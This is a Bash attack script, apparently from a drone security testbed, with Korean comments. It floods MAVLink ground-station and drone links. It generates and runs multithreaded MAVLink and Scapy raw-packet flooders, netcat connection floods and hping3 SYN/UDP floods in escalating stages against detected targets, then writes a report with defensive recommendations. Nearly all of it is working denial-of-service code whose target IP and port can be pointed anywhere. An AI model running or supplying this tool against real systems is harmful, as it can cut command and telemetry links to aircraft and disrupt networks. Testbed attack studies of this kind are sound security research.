#!/bin/bash
# communication_link_flood.sh - 통신 링크 플러딩 공격 도구
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/denial_of_service/communication_link_flood.sh

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="Communication Link Flooding Attack"
LOG_FILE="$(get_log_dir)/communication_link_flood.log"

print_banner() {
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════════╗"
    echo "║        통신 링크 플러딩 공격         ║"
    echo "╚═══════════════════════════════════════╝"
    echo -e "${NC}"
}

check_prerequisites() {
    log_info "Checking prerequisites..."
    
    local required_tools=("python3" "pip3" "netcat" "hping3")
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            if [[ "$tool" == "hping3" ]]; then
                log_warning "$tool not found - UDP flooding will use alternative methods"
            else
                log_error "$tool is not installed"
                exit 1
            fi
        fi
    done
    
    # Python 라이브러리 확인 및 설치
    if ! python3 -c "import pymavlink" 2>/dev/null; then
        log_info "Installing pymavlink..."
        pip3 install pymavlink >/dev/null 2>&1
    fi
    
    if ! python3 -c "import scapy" 2>/dev/null; then
        log_info "Installing scapy..."
        pip3 install scapy >/dev/null 2>&1
    fi
    
    log_success "Prerequisites check completed"
}

detect_communication_targets() {
    log_info "Detecting communication targets..."
    
    local targets=()
    local network_mode=""
    
    # 네트워크 모드 감지
    if ip addr show | grep -q "192.168.13"; then
        network_mode="wifi"
        targets+=("192.168.13.1:5760:tcp" "192.168.13.14:14550:udp" "192.168.13.1:14580:udp")
        log_info "WiFi mode detected"
    elif ip addr show | grep -q "10.13.0"; then
        network_mode="docker"
        targets+=("10.13.0.3:5760:tcp" "10.13.0.4:14550:udp" "10.13.0.3:14580:udp")
        log_info "Docker bridge mode detected"
    else
        network_mode="generic"
        targets+=("127.0.0.1:5760:tcp" "127.0.0.1:14550:udp" "127.0.0.1:14580:udp")
        log_warning "Generic network mode, using localhost targets"
    fi
    
    echo -e "${CYAN}Communication targets:${NC}"
    for target in "${targets[@]}"; do
        local ip=$(echo "$target" | cut -d: -f1)
        local port=$(echo "$target" | cut -d: -f2)
        local protocol=$(echo "$target" | cut -d: -f3)
        echo "  └─ $ip:$port ($protocol)"
    done
    
    echo "$network_mode:${targets[*]}"
}

test_communication_connectivity() {
    local target="$1"
    
    local ip=$(echo "$target" | cut -d: -f1)
    local port=$(echo "$target" | cut -d: -f2)
    local protocol=$(echo "$target" | cut -d: -f3)
    
    log_info "Testing connectivity to $ip:$port ($protocol)..."
    
    if [[ "$protocol" == "tcp" ]]; then
        if timeout 5 bash -c "</dev/tcp/$ip/$port" 2>/dev/null; then
            log_success "TCP connection to $ip:$port successful"
            return 0
        else
            log_warning "TCP connection to $ip:$port failed"
            return 1
        fi
    elif [[ "$protocol" == "udp" ]]; then
        # UDP는 연결 확인이 어려우므로 포트가 열려있다고 가정
        if nc -u -z -w3 "$ip" "$port" 2>/dev/null; then
            log_success "UDP port $ip:$port appears open"
            return 0
        else
            log_warning "UDP port $ip:$port may be closed"
            return 1
        fi
    fi
    
    return 1
}

create_mavlink_flood_script() {
    local script_path="/tmp/mavlink_flood.py"
    
    cat > "$script_path" << 'EOF'
#!/usr/bin/env python3
"""
MAVLink 통신 플러딩 공격 스크립트
"""

import sys
import time
import socket
import threading
import random
from pymavlink import mavutil

class MAVLinkFlooder:
    def __init__(self, target_ip, target_port, protocol="tcp"):
        self.target_ip = target_ip
        self.target_port = target_port
        self.protocol = protocol
        self.flooding_active = False
        self.flood_threads = []
        self.stats = {
            'messages_sent': 0,
            'bytes_sent': 0,
            'connections_made': 0,
            'start_time': 0
        }
    
    def create_mavlink_heartbeat(self):
        """MAVLink HEARTBEAT 메시지 생성"""
        try:
            mav = mavutil.mavlink.MAVLink(None)
            mav.srcSystem = random.randint(1, 255)
            mav.srcComponent = random.randint(1, 255)
            
            msg = mav.heartbeat_encode(
                type=mavutil.mavlink.MAV_TYPE_GCS,
                autopilot=mavutil.mavlink.MAV_AUTOPILOT_INVALID,
                base_mode=0,
                custom_mode=0,
                system_status=mavutil.mavlink.MAV_STATE_ACTIVE
            )
            
            return msg.pack(mav)
        except Exception as e:
            print(f"[-] Heartbeat creation error: {e}")
            return b'\xfe\x09\x00\x01\x01\x00\x00\x00\x00\x00\x02\x03\x51\x04\x05\x1e\x47'  # Fallback
    
    def create_mavlink_ping(self):
        """MAVLink PING 메시지 생성"""
        try:
            mav = mavutil.mavlink.MAVLink(None)
            mav.srcSystem = random.randint(1, 255)
            mav.srcComponent = random.randint(1, 255)
            
            msg = mav.ping_encode(
                time_usec=int(time.time() * 1e6),
                seq=random.randint(0, 65535),
                target_system=1,
                target_component=1
            )
            
            return msg.pack(mav)
        except Exception as e:
            print(f"[-] Ping creation error: {e}")
            return b'\xfe\x0e\x00\x01\x01\x04\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01\x00\x00\x9c\x16'  # Fallback
    
    def create_large_mavlink_message(self):
        """큰 MAVLink 메시지 생성"""
        try:
            mav = mavutil.mavlink.MAVLink(None)
            mav.srcSystem = random.randint(1, 255)
            mav.srcComponent = random.randint(1, 255)
            
            # 큰 메시지 (LOGGING_DATA)
            data = b'A' * 249  # Maximum payload size
            msg = mav.logging_data_encode(
                target_system=1,
                target_component=1,
                sequence=random.randint(0, 65535),
                length=len(data),
                first_message_offset=0,
                data=list(data)
            )
            
            return msg.pack(mav)
        except Exception as e:
            print(f"[-] Large message creation error: {e}")
            return b'A' * 263  # Fallback large message
    
    def tcp_flood_worker(self, rate_hz=100, duration=60):
        """TCP 플러딩 워커"""
        print(f"[*] Starting TCP flood worker at {rate_hz} Hz")
        
        end_time = time.time() + duration
        message_count = 0
        
        while self.flooding_active and time.time() < end_time:
            try:
                # 새 연결 생성
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                
                try:
                    sock.connect((self.target_ip, self.target_port))
                    self.stats['connections_made'] += 1
                    
                    # 메시지 전송
                    messages = [
                        self.create_mavlink_heartbeat(),
                        self.create_mavlink_ping(),
                        self.create_large_mavlink_message()
                    ]
                    
                    for _ in range(10):  # 연결당 10개 메시지
                        if not self.flooding_active:
                            break
                        
                        msg = random.choice(messages)
                        sock.send(msg)
                        
                        message_count += 1
                        self.stats['messages_sent'] += 1
                        self.stats['bytes_sent'] += len(msg)
                        
                        time.sleep(1.0 / rate_hz)
                
                except socket.error:
                    pass
                finally:
                    sock.close()
                
                # 연결 간 대기
                time.sleep(0.1)
                
            except Exception as e:
                print(f"[-] TCP flood error: {e}")
                break
        
        print(f"[+] TCP worker completed: {message_count} messages")
    
    def udp_flood_worker(self, rate_hz=1000, duration=60):
        """UDP 플러딩 워커"""
        print(f"[*] Starting UDP flood worker at {rate_hz} Hz")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            end_time = time.time() + duration
            message_count = 0
            
            while self.flooding_active and time.time() < end_time:
                try:
                    # 메시지 생성
                    messages = [
                        self.create_mavlink_heartbeat(),
                        self.create_mavlink_ping(),
                        self.create_large_mavlink_message(),
                        b'X' * 1024  # 큰 더미 데이터
                    ]
                    
                    msg = random.choice(messages)
                    sock.sendto(msg, (self.target_ip, self.target_port))
                    
                    message_count += 1
                    self.stats['messages_sent'] += 1
                    self.stats['bytes_sent'] += len(msg)
                    
                    if message_count % 1000 == 0:
                        print(f"[*] UDP: {message_count} messages sent")
                    
                    time.sleep(1.0 / rate_hz)
                    
                except Exception as e:
                    print(f"[-] UDP send error: {e}")
                    break
            
            sock.close()
            print(f"[+] UDP worker completed: {message_count} messages")
            
        except Exception as e:
            print(f"[-] UDP flood error: {e}")
    
    def start_flood_attack(self, rate_hz=500, duration=120, num_threads=5):
        """플러딩 공격 시작"""
        print(f"[*] Starting MAVLink flood attack")
        print(f"[*] Target: {self.target_ip}:{self.target_port} ({self.protocol})")
        print(f"[*] Rate: {rate_hz} Hz per thread")
        print(f"[*] Threads: {num_threads}")
        print(f"[*] Duration: {duration} seconds")
        
        self.flooding_active = True
        self.stats['start_time'] = time.time()
        
        # 워커 스레드 생성
        for i in range(num_threads):
            if self.protocol == "tcp":
                worker = threading.Thread(
                    target=self.tcp_flood_worker,
                    args=(rate_hz, duration),
                    name=f"TCP-Worker-{i}"
                )
            else:  # UDP
                worker = threading.Thread(
                    target=self.udp_flood_worker,
                    args=(rate_hz, duration),
                    name=f"UDP-Worker-{i}"
                )
            
            worker.daemon = True
            worker.start()
            self.flood_threads.append(worker)
            
            time.sleep(0.1)  # 스레드 시작 간격
        
        print(f"[+] Started {len(self.flood_threads)} flood workers")
        
        # 플러딩 모니터링
        self.monitor_flood_progress(duration)
        
        # 공격 종료
        self.stop_flood_attack()
    
    def monitor_flood_progress(self, duration):
        """플러딩 진행 상황 모니터링"""
        start_time = time.time()
        last_stats = dict(self.stats)
        
        while time.time() - start_time < duration and self.flooding_active:
            time.sleep(10)  # 10초마다 통계 출력
            
            elapsed = time.time() - self.stats['start_time']
            if elapsed > 0:
                msg_rate = self.stats['messages_sent'] / elapsed
                byte_rate = self.stats['bytes_sent'] / elapsed / 1024  # KB/s
                
                print(f"[*] Progress: {elapsed:.1f}s")
                print(f"[*] Messages: {self.stats['messages_sent']} ({msg_rate:.1f} msg/s)")
                print(f"[*] Data: {self.stats['bytes_sent']/1024:.1f} KB ({byte_rate:.1f} KB/s)")
                if self.protocol == "tcp":
                    print(f"[*] Connections: {self.stats['connections_made']}")
    
    def stop_flood_attack(self):
        """플러딩 공격 중지"""
        print("[*] Stopping flood attack...")
        
        self.flooding_active = False
        
        # 모든 워커 스레드 종료 대기
        for thread in self.flood_threads:
            thread.join(timeout=5)
        
        # 최종 통계
        elapsed = time.time() - self.stats['start_time']
        avg_msg_rate = self.stats['messages_sent'] / elapsed if elapsed > 0 else 0
        avg_byte_rate = self.stats['bytes_sent'] / elapsed / 1024 if elapsed > 0 else 0
        
        print(f"[+] Flood attack completed")
        print(f"[+] Duration: {elapsed:.1f} seconds")
        print(f"[+] Total messages: {self.stats['messages_sent']}")
        print(f"[+] Total data: {self.stats['bytes_sent']/1024:.1f} KB")
        print(f"[+] Average rate: {avg_msg_rate:.1f} msg/s ({avg_byte_rate:.1f} KB/s)")
        if self.protocol == "tcp":
            print(f"[+] Total connections: {self.stats['connections_made']}")
        
        return self.stats

def main():
    if len(sys.argv) < 4:
        print("Usage: python3 mavlink_flood.py <ip> <port> <protocol> [rate] [duration] [threads]")
        print("Protocols: tcp, udp")
        print("Example: python3 mavlink_flood.py 192.168.1.100 5760 tcp 500 120 5")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    protocol = sys.argv[3].lower()
    
    rate_hz = int(sys.argv[4]) if len(sys.argv) > 4 else 500
    duration = int(sys.argv[5]) if len(sys.argv) > 5 else 120
    num_threads = int(sys.argv[6]) if len(sys.argv) > 6 else 5
    
    if protocol not in ["tcp", "udp"]:
        print("[-] Invalid protocol. Use 'tcp' or 'udp'")
        sys.exit(1)
    
    # 플러더 생성 및 실행
    flooder = MAVLinkFlooder(target_ip, target_port, protocol)
    
    try:
        flooder.start_flood_attack(rate_hz, duration, num_threads)
    except KeyboardInterrupt:
        print("\n[*] Attack interrupted by user")
        flooder.stop_flood_attack()

if __name__ == "__main__":
    main()
EOF

    chmod +x "$script_path"
    echo "$script_path"
}

create_raw_flood_script() {
    local script_path="/tmp/raw_flood.py"
    
    cat > "$script_path" << 'EOF'
#!/usr/bin/env python3
"""
원시 패킷 플러딩 스크립트
"""

import sys
import time
import threading
import random

try:
    from scapy.all import IP, TCP, UDP, Raw, send, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

class RawPacketFlooder:
    def __init__(self, target_ip, target_port, protocol="udp"):
        self.target_ip = target_ip
        self.target_port = target_port
        self.protocol = protocol
        self.flooding_active = False
        self.flood_threads = []
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'start_time': 0
        }
    
    def create_flood_packet(self, size=1024):
        """플러딩 패킷 생성"""
        if not SCAPY_AVAILABLE:
            return None
        
        # 랜덤 소스 포트
        src_port = random.randint(1024, 65535)
        
        # 페이로드 생성
        payload = Raw(b'X' * size)
        
        if self.protocol == "tcp":
            packet = IP(dst=self.target_ip) / TCP(sport=src_port, dport=self.target_port) / payload
        else:  # UDP
            packet = IP(dst=self.target_ip) / UDP(sport=src_port, dport=self.target_port) / payload
        
        return packet
    
    def flood_worker(self, rate_hz=100, duration=60, packet_size=1024):
        """플러딩 워커"""
        if not SCAPY_AVAILABLE:
            print("[-] Scapy not available, cannot send raw packets")
            return
        
        print(f"[*] Starting raw {self.protocol.upper()} flood worker")
        
        end_time = time.time() + duration
        packet_count = 0
        
        while self.flooding_active and time.time() < end_time:
            try:
                packet = self.create_flood_packet(packet_size)
                if packet:
                    send(packet, verbose=0)
                    
                    packet_count += 1
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += packet_size
                    
                    if packet_count % 1000 == 0:
                        print(f"[*] Raw flood: {packet_count} packets sent")
                
                time.sleep(1.0 / rate_hz)
                
            except Exception as e:
                print(f"[-] Raw flood error: {e}")
                break
        
        print(f"[+] Raw flood worker completed: {packet_count} packets")
    
    def start_flood(self, rate_hz=500, duration=60, num_threads=3, packet_size=1024):
        """플러딩 시작"""
        if not SCAPY_AVAILABLE:
            print("[-] Scapy not available for raw packet flooding")
            return {}
        
        print(f"[*] Starting raw packet flood")
        print(f"[*] Target: {self.target_ip}:{self.target_port} ({self.protocol})")
        print(f"[*] Rate: {rate_hz} pps per thread")
        print(f"[*] Packet size: {packet_size} bytes")
        print(f"[*] Threads: {num_threads}")
        print(f"[*] Duration: {duration} seconds")
        
        self.flooding_active = True
        self.stats['start_time'] = time.time()
        
        # 워커 스레드 생성
        for i in range(num_threads):
            worker = threading.Thread(
                target=self.flood_worker,
                args=(rate_hz, duration, packet_size),
                name=f"Raw-Worker-{i}"
            )
            worker.daemon = True
            worker.start()
            self.flood_threads.append(worker)
        
        # 모든 워커 완료 대기
        for thread in self.flood_threads:
            thread.join()
        
        self.flooding_active = False
        
        # 통계
        elapsed = time.time() - self.stats['start_time']
        avg_rate = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0
        
        print(f"[+] Raw flood completed")
        print(f"[+] Packets sent: {self.stats['packets_sent']}")
        print(f"[+] Average rate: {avg_rate:.1f} pps")
        
        return self.stats

def main():
    if len(sys.argv) < 4:
        print("Usage: python3 raw_flood.py <ip> <port> <protocol> [rate] [duration] [threads] [size]")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    protocol = sys.argv[3].lower()
    
    rate_hz = int(sys.argv[4]) if len(sys.argv) > 4 else 500
    duration = int(sys.argv[5]) if len(sys.argv) > 5 else 60
    num_threads = int(sys.argv[6]) if len(sys.argv) > 6 else 3
    packet_size = int(sys.argv[7]) if len(sys.argv) > 7 else 1024
    
    flooder = RawPacketFlooder(target_ip, target_port, protocol)
    
    try:
        flooder.start_flood(rate_hz, duration, num_threads, packet_size)
    except KeyboardInterrupt:
        print("\n[*] Attack interrupted")
        flooder.flooding_active = False

if __name__ == "__main__":
    main()
EOF

    chmod +x "$script_path"
    echo "$script_path"
}

execute_communication_flood() {
    local target="$1"
    local attack_type="$2"
    local rate="${3:-500}"
    local duration="${4:-60}"
    
    log_info "Executing communication flooding attack..."
    
    local ip=$(echo "$target" | cut -d: -f1)
    local port=$(echo "$target" | cut -d: -f2)
    local protocol=$(echo "$target" | cut -d: -f3)
    
    echo -e "${YELLOW}[*] Target: $ip:$port ($protocol)${NC}"
    echo -e "${YELLOW}[*] Attack Type: $attack_type${NC}"
    echo -e "${YELLOW}[*] Rate: $rate pps/msg, Duration: ${duration}s${NC}"
    echo -e "${CYAN}[*] Executing attack...${NC}"
    
    local attack_output=""
    local success=false
    
    case "$attack_type" in
        "mavlink_flood")
            echo -e "${RED}[!] MAVLink message flooding${NC}"
            local script_path=$(create_mavlink_flood_script)
            attack_output=$(python3 "$script_path" "$ip" "$port" "$protocol" "$rate" "$duration" 3 2>&1)
            [[ $? -eq 0 ]] && success=true
            rm -f "$script_path"
            ;;
        "raw_flood")
            echo -e "${RED}[!] Raw packet flooding${NC}"
            local script_path=$(create_raw_flood_script)
            attack_output=$(python3 "$script_path" "$ip" "$port" "$protocol" "$rate" "$duration" 3 1024 2>&1)
            [[ $? -eq 0 ]] && success=true
            rm -f "$script_path"
            ;;
        "netcat_flood")
            echo -e "${RED}[!] Netcat flooding${NC}"
            if [[ "$protocol" == "tcp" ]]; then
                timeout "$duration" bash -c "
                    for i in {1..1000}; do
                        echo 'FLOOD_DATA_$i' | nc -q 1 $ip $port &
                        sleep 0.1
                    done
                    wait
                " >/dev/null 2>&1
                attack_output="Netcat TCP flood completed"
            else
                timeout "$duration" bash -c "
                    for i in {1..5000}; do
                        echo 'FLOOD_DATA_$i' | nc -u -q 1 $ip $port &
                        [[ \$((i % 100)) -eq 0 ]] && sleep 0.1
                    done
                    wait
                " >/dev/null 2>&1
                attack_output="Netcat UDP flood completed"
            fi
            success=true
            ;;
        "hping_flood")
            if command -v hping3 >/dev/null 2>&1; then
                echo -e "${RED}[!] Hping3 flooding${NC}"
                if [[ "$protocol" == "tcp" ]]; then
                    timeout "$duration" hping3 -S -p "$port" -i u100 "$ip" >/dev/null 2>&1
                    attack_output="Hping3 TCP SYN flood completed"
                else
                    timeout "$duration" hping3 --udp -p "$port" -i u100 "$ip" >/dev/null 2>&1
                    attack_output="Hping3 UDP flood completed"
                fi
                success=true
            else
                attack_output="Hping3 not available"
                success=false
            fi
            ;;
    esac
    
    echo "$attack_output"
    
    if $success; then
        log_success "Communication flooding attack executed successfully"
    else
        log_warning "Communication flooding attack may have failed"
    fi
    
    echo "$success:$attack_output"
}

perform_escalating_flood_attack() {
    local targets=("$@")
    
    log_info "Performing escalating communication flood attack..."
    
    local flood_stages=(
        "netcat_flood:Netcat flooding:100:30"
        "mavlink_flood:MAVLink message flood:500:60"
        "raw_flood:Raw packet flood:1000:60"
        "hping_flood:Hping3 flood:2000:60"
    )
    
    echo -e "${GREEN}=== Escalating Communication Flood Attack ===${NC}"
    
    local stage_results=()
    local successful_stages=0
    local total_stages=0
    
    for target in "${targets[@]}"; do
        local ip=$(echo "$target" | cut -d: -f1)
        local port=$(echo "$target" | cut -d: -f2)
        local protocol=$(echo "$target" | cut -d: -f3)
        
        echo -e "\n${BLUE}[*] Target: $ip:$port ($protocol)${NC}"
        
        for stage in "${flood_stages[@]}"; do
            local attack_type=$(echo "$stage" | cut -d: -f1)
            local description=$(echo "$stage" | cut -d: -f2)
            local rate=$(echo "$stage" | cut -d: -f3)
            local duration=$(echo "$stage" | cut -d: -f4)
            
            echo -e "\n${CYAN}[*] Stage: $description${NC}"
            ((total_stages++))
            
            local result=$(execute_communication_flood "$target" "$attack_type" "$rate" "$duration")
            local success=$(echo "$result" | cut -d: -f1)
            
            if [[ "$success" == "true" ]]; then
                ((successful_stages++))
                stage_results+=("$ip:$port:$description:SUCCESS")
                echo -e "${GREEN}  └─ Stage succeeded${NC}"
            else
                stage_results+=("$ip:$port:$description:FAILED")
                echo -e "${RED}  └─ Stage failed${NC}"
            fi
            
            # 단계 간 대기 (네트워크 회복)
            echo -e "${YELLOW}  └─ Waiting for network recovery...${NC}"
            sleep 10
        done
    done
    
    echo -e "\n${GREEN}=== Flood Attack Summary ===${NC}"
    echo "  └─ Total stages: $total_stages"
    echo "  └─ Successful stages: $successful_stages"
    echo "  └─ Success rate: $((successful_stages * 100 / total_stages))%"
    
    echo -e "\n${CYAN}Stage Details:${NC}"
    for result in "${stage_results[@]}"; do
        local target_info=$(echo "$result" | cut -d: -f1,2)
        local desc=$(echo "$result" | cut -d: -f3)
        local status=$(echo "$result" | cut -d: -f4)
        
        if [[ "$status" == "SUCCESS" ]]; then
            echo "  └─ $target_info $desc: ${GREEN}$status${NC}"
        else
            echo "  └─ $target_info $desc: ${RED}$status${NC}"
        fi
    done
    
    echo "$successful_stages:$total_stages"
}

monitor_network_impact() {
    local duration="${1:-30}"
    
    log_info "Monitoring network impact..."
    
    echo -e "${YELLOW}[*] Monitoring network for ${duration} seconds...${NC}"
    
    local start_time=$(date +%s)
    local initial_stats=""
    local final_stats=""
    
    # 초기 네트워크 통계 수집
    if command -v ss >/dev/null 2>&1; then
        initial_stats=$(ss -tuln | wc -l)
    fi
    
    # 네트워크 연결 모니터링
    local connection_samples=()
    
    while [[ $(($(date +%s) - start_time)) -lt $duration ]]; do
        # 활성 연결 수 수집
        if command -v ss >/dev/null 2>&1; then
            local connections=$(ss -tu | grep -c ESTAB)
            connection_samples+=($connections)
        fi
        
        # CPU 로드 확인 (간단한 방법)
        local load=$(uptime | awk -F'load average:' '{print $2}' | awk '{print $1}' | sed 's/,//')
        echo -ne "\r${GREEN}[*] Monitoring... ${load} load, connections sampled: ${#connection_samples[@]}${NC}"
        
        sleep 5
    done
    echo ""
    
    # 최종 통계 수집
    if command -v ss >/dev/null 2>&1; then
        final_stats=$(ss -tuln | wc -l)
    fi
    
    # 통계 분석
    local max_connections=0
    local avg_connections=0
    
    if [[ ${#connection_samples[@]} -gt 0 ]]; then
        for conn in "${connection_samples[@]}"; do
            [[ $conn -gt $max_connections ]] && max_connections=$conn
            ((avg_connections += conn))
        done
        avg_connections=$((avg_connections / ${#connection_samples[@]}))
    fi
    
    echo -e "${GREEN}=== Network Impact Summary ===${NC}"
    echo "  └─ Monitoring duration: ${duration}s"
    echo "  └─ Connection samples: ${#connection_samples[@]}"
    echo "  └─ Max connections: $max_connections"
    echo "  └─ Average connections: $avg_connections"
    
    if [[ -n "$initial_stats" && -n "$final_stats" ]]; then
        echo "  └─ Socket count change: $initial_stats → $final_stats"
    fi
}

generate_communication_flood_report() {
    local attack_summary="$1"
    
    log_info "Generating communication flood attack report..."
    
    local successful=$(echo "$attack_summary" | cut -d: -f1)
    local total=$(echo "$attack_summary" | cut -d: -f2)
    local success_rate=$((successful * 100 / total))
    
    local report_file="$(get_log_dir)/communication_flood_report_$(date +%Y%m%d_%H%M%S).txt"
    
    cat > "$report_file" << EOF
╔═══════════════════════════════════════════════════╗
║           통신 링크 플러딩 공격 보고서            ║
╚═══════════════════════════════════════════════════╝

Date: $(date)
Attack Type: Communication Link Flooding
Success Rate: ${success_rate}% (${successful}/${total})

╔═══ ATTACK SUMMARY ═══╗

Target Protocols: TCP/UDP MAVLink
Attack Vectors:
  - MAVLink message flooding
  - Raw packet flooding  
  - Connection flooding
  - Bandwidth saturation

╔═══ ATTACK EXECUTION ═══╗

$(cat "$LOG_FILE" | grep -A 25 "Escalating Communication Flood Attack" | tail -25)

╔═══ NETWORK IMPACT ═══╗

$(cat "$LOG_FILE" | grep -A 10 "Network Impact Summary" | tail -10)

╔═══ SECURITY IMPLICATIONS ═══╗

1. Service Availability
   - Communication channel saturation
   - Message processing overload
   - Connection exhaustion

2. Operational Impact
   - Telemetry data loss
   - Command delivery failure
   - Real-time control disruption

3. System Stability
   - Buffer overflow potential
   - Resource exhaustion
   - Service degradation

╔═══ ATTACK MECHANISMS ═══╗

1. Message Flooding
   - High-frequency MAVLink messages
   - Protocol-aware packet crafting
   - Connection multiplexing

2. Bandwidth Exhaustion
   - Large payload injection
   - Sustained high data rates
   - Multi-threaded flooding

3. Connection Saturation
   - TCP connection flooding
   - UDP packet storms
   - Resource pool exhaustion

╔═══ EXPLOITATION SCENARIOS ═══╗

1. Mission Disruption
   - Command channel blocking
   - Telemetry stream interruption
   - Navigation data corruption

2. Communication Denial
   - GCS-drone link saturation
   - Emergency command blocking
   - Status reporting failure

3. System Overload
   - Processing queue overflow
   - Memory exhaustion
   - Service crash induction

╔═══ DEFENSIVE RECOMMENDATIONS ═══╗

1. 네트워크 보안
   - 트래픽 속도 제한 구현
   - 연결 수 제한 설정
   - DDoS 방어 시스템

2. 프로토콜 강화
   - MAVLink 메시지 인증
   - 우선순위 기반 큐잉
   - 백프레셔 메커니즘

3. 시스템 모니터링
   - 네트워크 트래픽 감시
   - 연결 패턴 분석
   - 이상 탐지 알림

╚═══════════════════════╝
EOF

    log_success "Report saved to: $report_file"
    echo -e "${GREEN}Report location: $report_file${NC}"
}

cleanup() {
    log_info "Cleaning up temporary files..."
    rm -f /tmp/mavlink_flood.py /tmp/raw_flood.py 2>/dev/null
    
    # 백그라운드 프로세스 정리
    pkill -f "mavlink_flood.py" 2>/dev/null
    pkill -f "raw_flood.py" 2>/dev/null
    pkill -f "hping3" 2>/dev/null
}

main() {
    print_banner
    check_prerequisites
    
    log_info "Starting communication link flooding attack..."
    echo "Attack: $ATTACK_NAME" >> "$LOG_FILE"
    echo "Timestamp: $(date)" >> "$LOG_FILE"
    echo "================================" >> "$LOG_FILE"
    
    # 통신 타겟 탐지
    local target_info=$(detect_communication_targets)
    local network_mode=$(echo "$target_info" | cut -d: -f1)
    local targets=($(echo "$target_info" | cut -d: -f2-))
    
    # 연결 가능한 타겟 확인
    local active_targets=()
    for target in "${targets[@]}"; do
        if test_communication_connectivity "$target"; then
            active_targets+=("$target")
        fi
    done
    
    if [[ ${#active_targets[@]} -eq 0 ]]; then
        log_error "No active communication targets found"
        exit 1
    fi
    
    echo -e "\n${BLUE}[*] Active targets: ${#active_targets[@]}${NC}"
    for target in "${active_targets[@]}"; do
        local ip=$(echo "$target" | cut -d: -f1)
        local port=$(echo "$target" | cut -d: -f2)
        local protocol=$(echo "$target" | cut -d: -f3)
        echo "  └─ $ip:$port ($protocol)"
    done
    
    # 단계적 플러딩 공격
    echo -e "\n${BLUE}[*] Executing escalating flood attacks...${NC}"
    local attack_summary=$(perform_escalating_flood_attack "${active_targets[@]}")
    
    # 네트워크 영향 모니터링
    echo -e "\n${BLUE}[*] Monitoring network impact...${NC}"
    monitor_network_impact 60 | tee -a "$LOG_FILE"
    
    # 보고서 생성
    generate_communication_flood_report "$attack_summary"
    
    cleanup
    
    log_success "Communication link flooding attack completed"
    echo "Attack completed at $(date)" >> "$LOG_FILE"
}

# Signal handlers for graceful cleanup
trap cleanup EXIT
trap 'echo -e "\n${RED}Attack interrupted${NC}"; cleanup; exit 1' INT TERM

# Execute main function
main "$@"